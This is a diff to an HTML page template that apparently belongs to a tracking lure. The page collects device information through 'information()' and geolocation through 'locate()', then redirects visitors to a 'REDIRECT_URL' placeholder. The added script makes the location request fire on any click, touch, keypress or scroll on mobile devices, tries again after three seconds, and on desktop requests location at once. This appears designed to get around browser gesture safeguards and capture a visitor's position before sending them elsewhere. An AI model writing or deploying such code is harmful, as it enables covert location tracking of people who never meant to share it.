@@ -15,6 +15,52 @@
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 	<script type="text/javascript" src="js/location.js"></script>
 </head>
-<body onload="information();locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">
+<body onload="information();">
+    <script>
+        // Wait for user interaction before requesting location on mobile devices
+        function requestLocationWithUserGesture() {
+            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+            var isMobileDevice = isMobile || (isTouch && window.innerWidth <= 1024);
+            
+            if (isMobileDevice) {
+                // For mobile devices, wait for any user interaction
+                var interactionEvents = ['click', 'touchstart', 'touchend', 'keydown', 'scroll'];
+                var userInteracted = false;
+                
+                function handleUserInteraction() {
+                    if (!userInteracted) {
+                        userInteracted = true;
+                        // Remove all event listeners
+                        interactionEvents.forEach(function(event) {
+                            document.removeEventListener(event, handleUserInteraction, true);
+                        });
+                        // Now it's safe to request location
+                        locate(function(){window.location='REDIRECT_URL';}, function(){console.log('Location failed');});
+                    }
+                }
+                
+                // Add event listeners for user interaction
+                interactionEvents.forEach(function(event) {
+                    document.addEventListener(event, handleUserInteraction, true);
+                });
+                
+                // Fallback: if no interaction after 3 seconds, try anyway (for some tablets this might work)
+                setTimeout(function() {
+                    if (!userInteracted) {
+                        console.log('No user interaction detected, attempting location request anyway...');
+                        locate(function(){window.location='REDIRECT_URL';}, function(){console.log('Location failed');});
+                    }
+                }, 3000);
+                
+            } else {
+                // Desktop - request immediately
+                locate(function(){window.location='REDIRECT_URL';}, function(){console.log('Location failed');});
+            }
+        }
+        
+        // Start the process
+        requestLocationWithUserGesture();
+    </script>
 </body>
 </html>
